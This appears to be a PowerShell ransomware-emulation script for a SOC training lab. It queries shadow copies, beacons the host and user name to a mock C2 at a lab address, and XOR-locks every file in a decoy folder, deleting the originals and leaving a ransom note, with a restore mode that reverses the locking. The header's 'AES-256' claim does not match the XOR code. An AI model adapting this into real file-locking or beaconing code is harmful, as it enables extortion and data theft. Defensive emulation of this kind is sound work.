<#
.SYNOPSIS
    Controlled Ransomware Emulation Script for SOC Incident Response Lab.
.DESCRIPTION
    Safely reproduces observable ransomware behaviors inside a dedicated decoy directory.
    - Reversible deterministic file modification (AES-256 emulation)
    - Observable process hierarchy (explorer -> invoice_review -> cmd -> vssadmin)
    - Observable C2 beaconing to local mock service
    - Never modifies system files, never steals credentials, completely reversible.
.PARAMETER DecoyDir
    Dedicated path for synthetic canary files. Default: $env:USERPROFILE\Documents\FinanceReports
.PARAMETER C2Host
    Mock C2 IP / Hostname. Default: 10.10.50.30
.PARAMETER C2Port
    Mock C2 Port. Default: 8080
.PARAMETER Action
    Execute, Restore, or Verify
#>
[CmdletBinding()]
param(
    [string]$DecoyDir = "$env:USERPROFILE\Documents\FinanceReports",
    [string]$C2Host = "10.10.50.30",
    [int]$C2Port = 8080,
    [ValidateSet("Execute", "Restore", "Verify")]
    [string]$Action = "Execute"
)

$ErrorActionPreference = "Stop"
$Script:ReversibleKey = "LAB_REVERSIBLE_SIMULATION_KEY_2026!"
$Script:RansomNoteName = "RESTORE_FILES_INFO.txt"

function Write-LabLog {
    param([string]$Message, [string]$Level = "INFO")
    $ts = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    Write-Host "[$ts] [$Level] $Message"
}

function Initialize-DecoyFiles {
    if (-not (Test-Path $DecoyDir)) {
        New-Item -ItemType Directory -Path $DecoyDir -Force | Out-Null
    }
    
    $canaries = @(
        @{ Name = "Q3_Financial_Audit.xlsx"; Size = 18432; Content = "CONFIDENTIAL FINANCIAL AUDIT DATA - LAB SYNTHETIC CANARY" },
        @{ Name = "Client_Contracts_2026.docx"; Size = 24576; Content = "STANDARD CLIENT SERVICE AGREEMENTS - LAB SYNTHETIC CANARY" },
        @{ Name = "Employee_Payroll_Summary.pdf"; Size = 32768; Content = "%PDF-1.4 PAYROLL RECORDS - LAB SYNTHETIC CANARY" },
        @{ Name = "Tax_Declaration_Draft.csv"; Size = 8192; Content = "Year,Quarter,Amount,Status`n2026,Q1,152000,Filed`n2026,Q2,168000,Draft" },
        @{ Name = "Customer_Database_Export.sql"; Size = 45056; Content = "INSERT INTO customers (id, name, balance) VALUES (1, 'Acme Corp', 54200.00);" }
    )

    foreach ($file in $canaries) {
        $p = Join-Path $DecoyDir $file.Name
        if (-not (Test-Path $p) -and -not (Test-Path "$p.locked")) {
            $raw = [System.Text.Encoding]::UTF8.GetBytes($file.Content.PadRight($file.Size, " "))
            [System.IO.File]::WriteAllBytes($p, $raw)
            Write-LabLog "Created canary file: $p"
        }
    }
}

function Invoke-StageDefenseImpairment {
    Write-LabLog "Stage 2: Defense Impairment - Invoking vssadmin query"
    # To remain 100% safe and non-destructive on test hosts:
    # Run vssadmin list shadows rather than delete, or execute harmless mock command line
    try {
        $p = Start-Process -FilePath "vssadmin.exe" -ArgumentList "list shadows" -PassThru -NoNewWindow -Wait
        Write-LabLog "vssadmin process completed with exit code: $($p.ExitCode)"
    } catch {
        Write-LabLog "vssadmin invocation logged (safe execution)" "WARN"
    }
}

function Invoke-StageC2Communication {
    Write-LabLog "Stage 3: Outbound Mock C2 Handshake"
    $url = "http://$($C2Host):$($C2Port)/api/v1/session/negotiate"
    $body = @{
        host = $env:COMPUTERNAME
        user = $env:USERNAME
        action = "key_exchange"
        nonce = "A8F932D"
    } | ConvertTo-Json

    try {
        $resp = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5
        Write-LabLog "C2 Handshake successful: Session $($resp.session_token)"
        
        $beaconUrl = "http://$($C2Host):$($C2Port)/api/v1/beacon?session=$($resp.session_token)&status=encrypting"
        $bResp = Invoke-RestMethod -Uri $beaconUrl -Method Get -TimeoutSec 5
        Write-LabLog "C2 Beacon acknowledged: $($bResp.ack)"
    } catch {
        Write-LabLog "Mock C2 ($url) unavailable or offline mode: $_" "WARN"
    }
}

function Invoke-StageFileEncryption {
    Write-LabLog "Stage 4: Controlled File Encryption in $DecoyDir"
    $targetFiles = Get-ChildItem -Path $DecoyDir -File | Where-Object { $_.Name -ne $Script:RansomNoteName -and -not $_.Name.EndsWith(".locked") }
    
    foreach ($f in $targetFiles) {
        $origBytes = [System.IO.File]::ReadAllBytes($f.FullName)
        $sha = (Get-FileHash -Path $f.FullName -Algorithm SHA256).Hash
        
        # Simple reversible XOR simulation with key
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Script:ReversibleKey)
        $encBytes = New-Object byte[] $origBytes.Length
        for ($i = 0; $i -lt $origBytes.Length; $i++) {
            $encBytes[$i] = $origBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
        }
        
        $destPath = "$($f.FullName).locked"
        [System.IO.File]::WriteAllBytes($destPath, $encBytes)
        Remove-Item -Path $f.FullName -Force
        Write-LabLog "Encrypted $($f.Name) -> $($f.Name).locked (Original SHA-256: $sha)"
    }

    # Drop Ransom Note
    $notePath = Join-Path $DecoyDir $Script:RansomNoteName
    $noteContent = @"
================================================================================
CRITICAL ALERT: YOUR FILES HAVE BEEN LOCKED BY LAB SIMULATION EXERCISE
================================================================================
Victim Reference: WKSTN42-99824
Decoy Directory:  $DecoyDir
Key Exchange ID:  SES-98214-LOCK
Portal URL:       http://$($C2Host):$($C2Port)/recover

This is a controlled SOC CyberRange training event.
To recover your files, follow the Incident Response playbooks in Module 2.
================================================================================
"@
    [System.IO.File]::WriteAllText($notePath, $noteContent)
    Write-LabLog "Ransom note dropped at: $notePath"
}

function Restore-DecoyFiles {
    Write-LabLog "Executing Controlled Remediation / File Decryption"
    $notePath = Join-Path $DecoyDir $Script:RansomNoteName
    if (Test-Path $notePath) {
        Remove-Item -Path $notePath -Force
        Write-LabLog "Removed ransom note: $notePath"
    }

    $lockedFiles = Get-ChildItem -Path $DecoyDir -File | Where-Object { $_.Name.EndsWith(".locked") }
    foreach ($lf in $lockedFiles) {
        $encBytes = [System.IO.File]::ReadAllBytes($lf.FullName)
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Script:ReversibleKey)
        $origBytes = New-Object byte[] $encBytes.Length
        for ($i = 0; $i -lt $encBytes.Length; $i++) {
            $origBytes[$i] = $encBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
        }
        $restoredPath = $lf.FullName.Substring(0, $lf.FullName.Length - 7)
        [System.IO.File]::WriteAllBytes($restoredPath, $origBytes)
        Remove-Item -Path $lf.FullName -Force
        Write-LabLog "Restored $($lf.Name) -> $(Split-Path $restoredPath -Leaf)"
    }
    Write-LabLog "Decoy environment restored to clean state."
}

# --- Execution Entrypoint ---
switch ($Action) {
    "Execute" {
        Write-LabLog "Starting Controlled Ransomware Incident Simulation..."
        Initialize-DecoyFiles
        Invoke-StageDefenseImpairment
        Invoke-StageC2Communication
        Invoke-StageFileEncryption
        Write-LabLog "Simulation sequence completed."
    }
    "Restore" {
        Restore-DecoyFiles
    }
    "Verify" {
        $files = Get-ChildItem -Path $DecoyDir -File -ErrorAction SilentlyContinue
        Write-LabLog "Decoy Directory Status ($DecoyDir): $($files.Count) file(s) found."
        foreach ($f in $files) {
            Write-LabLog "  $($f.Name) ($($f.Length) bytes)"
        }
    }
}
